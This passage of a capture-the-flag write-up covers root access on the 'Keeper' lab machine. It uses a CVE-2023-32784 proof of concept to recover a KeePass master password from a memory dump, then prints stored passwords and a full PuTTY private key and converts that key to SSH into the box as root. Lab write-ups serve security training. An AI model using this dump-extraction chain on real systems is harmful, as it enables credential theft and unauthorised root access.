In the user folder we find the zip file called RT30000.zip where we can find a Keepass database and a Keepass dump memory file. Searching with google we find the vulnerability CVE-2023-32784 and **[this exploit](https://github.com/CMEPW/keepass-dump-masterkey)** in python.

```bash
lnorgaard@keeper:~$ python3 poc.py ./KeePassDumpFull.dmp 
2023-08-20 11:48:26,626 [.] [main] Opened ./KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Here we have to use some imagination because this is made with danish characters so we can't see it properly. The password is `rødgrød med fløde`. Now open the database with kpcli and lets see the items

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Keeper-10.10.11.227]
└─$ sudo kpcli --kdb passcodes.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/passcodes> find .
Searching for "." ...
 - 4 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. keeper.htb (Ticketing Server)                                          
1. Sample Entry                                               keepass.info
2. Sample Entry #2                          keepass.info/help/kb/testform.
3. Ticketing System                                                       
kpcli:/passcodes> 
kpcli:/passcodes> show -f 0

 Path: /passcodes/Network/
Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

kpcli:/passcodes> show -f 1

 Path: /passcodes/Recycle Bin/
Title: Sample Entry
Uname: User Name
 Pass: Password
  URL: https://keepass.info/
Notes: Notes

kpcli:/passcodes> show -f 2

 Path: /passcodes/Recycle Bin/
Title: Sample Entry #2
Uname: Michael321
 Pass: 12345
  URL: https://keepass.info/help/kb/testform.html
Notes: 

kpcli:/passcodes> show -f 3

 Path: /passcodes/Network/
Title: Ticketing System
Uname: lnorgaard
 Pass: Welcome2023!
  URL: 
Notes: http://tickets.keeper.htb
```

The item 0 is a putty file so lets save it as `keeper-putty.txt` and generate a valid ssh file with puttygen

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Keeper-10.10.11.227]
└─$ vim keeper-putty.txt

┌──(kali㉿kali)-[~/Documents/Boxes/Keeper-10.10.11.227]
└─$ puttygen keeper-putty.txt -O private-openssh -o id_rsa

┌──(kali㉿kali)-[~/Documents/Boxes/Keeper-10.10.11.227]
└─$ ssh root@10.10.11.227 -i id_rsa                                                   
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Sun Aug 20 04:31:28 2023 from 10.10.14.10
root@keeper:~# whoami
root
```

And we are root